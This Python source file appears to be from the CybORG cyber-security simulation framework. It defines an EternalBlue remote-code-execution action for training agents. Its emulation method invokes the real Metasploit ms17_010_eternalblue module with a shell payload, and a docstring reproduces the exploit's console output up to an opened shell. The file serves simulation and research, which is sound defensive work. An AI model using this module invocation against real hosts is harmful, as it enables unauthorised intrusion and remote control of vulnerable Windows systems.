# Copyright DST Group. Licensed under the MIT license.
from ipaddress import IPv4Address
from CybORG.Shared.Actions.MSFActionsFolder.RemoteCodeExecutionFolder.RemoteCodeExecution import RemoteCodeExecution

# use msf module exploit/windows/smb/ms17_010_eternal_blue, set RHOSTS to target
# could also change LHOST, LPORT and RPORT (default 139)
# gives root session
from CybORG.Shared.Enums import SessionType, ProcessType, ProcessVersion, OperatingSystemType, OperatingSystemPatch
from CybORG.Shared.Observation import Observation


class MSFEternalBlue(RemoteCodeExecution):
    def __init__(self, ip_address: IPv4Address, session: int, agent: str):
        super().__init__(session=session, agent=agent)
        self.target = ip_address

    def sim_execute(self, state):
        obs = Observation()
        obs.set_success(False)
        if self.session not in state.sessions[self.agent]:
            return obs
        session = state.sessions[self.agent][self.session]

        if session.session_type != SessionType.MSF_SERVER or not session.active:
            return obs

        # find shared subnet of the two hosts
        server_session, server_interface = self.get_local_source_interface(local_session=session, remote_address=self.target)

        if server_interface is None:
            return obs

        server_address = server_interface.ip_address

        if self.target == IPv4Address("127.0.0.1"):
            target_host = server_session.host
        else:
            target_host = state.hosts[state.ip_addresses[self.target]]

        # obs.add_interface_info(hostid='0', ip_address=server_address)
        # obs.add_interface_info(hostid='1', ip_address=self.target)

        # find out if smb is open
        smb_proc = None
        for proc in target_host.processes:
            if proc.process_type == ProcessType.SMB:
                # TODO: In case of SMB that is not the right version, should SMB process be in the obs?
                smb_proc = proc
                break

        # find out if smb is vulnerable (Windows OS + smb version)
        # Note that this exploit should actually work for all versions in the range Samba 3.0.20 - 3.0.25rc3
        if smb_proc is not None and smb_proc.version == ProcessVersion.SMBv1:
            obs.add_process(hostid="1", local_address=self.target, local_port=139, status="open",
                            process_type="smb")
            if target_host.os_type == OperatingSystemType.WINDOWS and OperatingSystemPatch.MS17_010:
                obs.set_success(True)

                root_user = None
                for u in state.hosts[state.ip_addresses[self.target]].users:
                    if u.username == "SYSTEM":
                        root_user = u

                new_session = state.add_session(host=target_host.hostname, agent=self.agent,
                                                user=root_user, session_type="meterpreter", parent=server_session)

                local_port = target_host.get_ephemeral_port()
                new_connection = {"local_port": local_port,
                                  "Application Protocol": "tcp",
                                  "remote_address": server_address,
                                  "remote_port": 4444,
                                  "local_address": self.target
                                  }
                new_session.process.connections.append(new_connection)

                target_host.add_process(name="telnet", ppid=1, path="/usr/bin/", user=root_user)
                remote_port = {"local_port": 4444,
                               "Application Protocol": "tcp",
                               "local_address": server_address,
                               "remote_address": self.target,
                               "remote_port": local_port
                               }

                server_session.process.connections.append(remote_port)

                obs.add_process(hostid="0", local_address=server_address, remote_address=str(self.target),
                                local_port=4444, remote_port=local_port)
                obs.add_process(hostid="1", local_address=str(self.target), remote_address=server_address,
                                local_port=local_port, remote_port=4444)
                obs.add_session_info(hostid="1", session_id=new_session.ident, session_type=new_session.session_type, agent=self.agent)
            else:
                obs.add_interface_info(ip_address=str(self.target))

        return obs

    def emu_execute(self, session_handler) -> Observation:
        obs = Observation()
        from CybORG.Emulator.Session import MSFSessionHandler
        if type(session_handler) is not MSFSessionHandler:
            obs.set_success(False)
            return obs
        output = session_handler.execute_module(mtype='exploit', mname='windows/smb/ms17_010_eternalblue', opts={'RHOSTS': str(self.target)}, payload_name='generic/shell_bind_tcp')
        obs.add_raw_obs(output)
        obs.set_success(False)
        session_handler._log_debug(output)
        """ Example:
        [*] Started reverse TCP handler on 10.0.5.31:4444 
        [*] 10.0.14.27:445 - Connecting to target for exploitation.
        [+] 10.0.14.27:445 - Connection established for exploitation.
        [+] 10.0.14.27:445 - Target OS selected valid for OS indicated by SMB reply
        [*] 10.0.14.27:445 - CORE raw buffer dump (51 bytes)
        [*] 10.0.14.27:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
        [*] 10.0.14.27:445 - 0x00000010  30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20  008 R2 Standard 
        [*] 10.0.14.27:445 - 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac
        [*] 10.0.14.27:445 - 0x00000030  6b 20 31                                         k 1             
        [+] 10.0.14.27:445 - Target arch selected valid for arch indicated by DCE/RPC reply
        [*] 10.0.14.27:445 - Trying exploit with 12 Groom Allocations.
        [*] 10.0.14.27:445 - Sending all but last fragment of exploit packet
        [*] 10.0.14.27:445 - Starting non-paged pool grooming
        [+] 10.0.14.27:445 - Sending SMBv2 buffers
        [+] 10.0.14.27:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
        [*] 10.0.14.27:445 - Sending final SMBv2 buffers.
        [*] 10.0.14.27:445 - Sending last fragment of exploit packet!
        [*] 10.0.14.27:445 - Receiving response from exploit packet
        [+] 10.0.14.27:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
        [*] 10.0.14.27:445 - Sending egg to corrupted connection.
        [*] 10.0.14.27:445 - Triggering free of corrupted buffer.
        [*] Command shell session 3 opened (10.0.5.31:4444 -> 10.0.14.27:49400) at 2020-08-07 06:09:46 +0000
        [+] 10.0.14.27:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
        [+] 10.0.14.27:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
        [+] 10.0.14.27:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
        """
        for line in output.split(('\n')):
            if '[*] Command shell session' in line:
                obs.set_success(True)
                #print(list(enumerate(line.split(' '))))
                split = line.split(' ')
                session = split[4]
                rip, rport = split[6].replace('(', '').split(':')
                lip, lport = split[8].replace(')', '').split(':')
                obs.add_session_info(hostid=str(self.target), session_id=session, session_type='msf_shell')
                obs.add_process(hostid=str(self.target), local_address=lip, local_port=lport, remote_address=rip, remote_port=rport)
        return obs
